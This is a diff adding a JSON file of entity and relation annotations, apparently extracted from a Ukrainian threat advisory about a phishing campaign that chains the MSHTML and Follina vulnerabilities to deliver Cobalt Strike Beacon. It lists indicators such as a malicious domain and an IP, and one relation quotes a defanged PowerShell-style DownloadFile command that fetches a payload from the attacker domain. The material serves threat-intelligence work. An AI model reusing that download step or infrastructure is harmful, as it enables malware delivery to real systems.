@@ -1,0 +1,69 @@
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "зміни оплата праці з нарахуваннями.docx",
+      "kind": "computer file",
+      "gloss": "A malicious Microsoft Word document distributed via phishing emails to Ukrainian government organizations."
+    },
+    {
+      "name": "Good thing we disabled macros.html",
+      "kind": "computer file",
+      "gloss": "A malicious HTML file containing JavaScript code used in the exploit chain."
+    },
+    {
+      "name": "CVE-2021-40444",
+      "kind": "security vulnerability",
+      "gloss": "A remote code execution vulnerability in Microsoft MSHTML."
+    },
+    {
+      "name": "CVE-2022-30190",
+      "kind": "security vulnerability",
+      "gloss": "A remote code execution vulnerability in Microsoft Windows Support Diagnostic Tool (MSDT), also known as Follina."
+    },
+    {
+      "name": "ms-msdt.exe",
+      "kind": "computer file",
+      "gloss": "An executable payload downloaded and executed during the attack to deploy Cobalt Strike Beacon."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware",
+      "gloss": "A post-exploitation agent and payload of the Cobalt Strike threat emulation framework."
+    },
+    {
+      "name": "sdiagnhost.exe",
+      "kind": "computer file",
+      "gloss": "A legitimate Microsoft Windows Scripted Diagnostics Native Host binary abused during exploitation."
+    },
+    {
+      "name": "nod-update.it",
+      "kind": "domain name",
+      "gloss": "A malicious domain used by attackers to host malware payloads."
+    },
+    {
+      "name": "185.64.106.39",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious network infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "nod-update.it",
+      "type": "hosts",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')"
+    },
+    {
+      "head": "ms-msdt.exe",
+      "type": "delivers",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "завантаження EXE-файлу \"ms-msdt.exe\" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon."
+    }
+  ],
+  "newRelationTypes": []
+}
